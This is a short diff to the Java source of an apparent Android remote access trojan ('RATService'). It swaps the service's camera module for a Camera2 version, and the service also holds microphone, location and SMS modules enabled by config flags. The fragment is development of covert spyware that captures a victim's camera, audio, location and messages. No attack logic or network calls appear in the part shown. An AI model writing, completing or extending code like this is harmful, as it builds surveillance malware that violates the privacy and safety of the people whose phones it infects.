@@ -81,7 +81,7 @@ public class RATService extends Service {
     private boolean isLocationTracking = false;
     
     // Modules
-    private CameraModule cameraModule;
+  private Camera2Module cameraModule;
     private MicModule micModule;
     private LocationModule locationModule;
     private SmsModule smsModule;
@@ -125,7 +125,8 @@ public class RATService extends Service {
         startLocationThread();
         
         // Initialize modules based on config
-        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
+        if (Config.ENABLE_CAMERA) cameraModule = new Camera2Module(this);
+        //if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
         if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
         if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
         if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
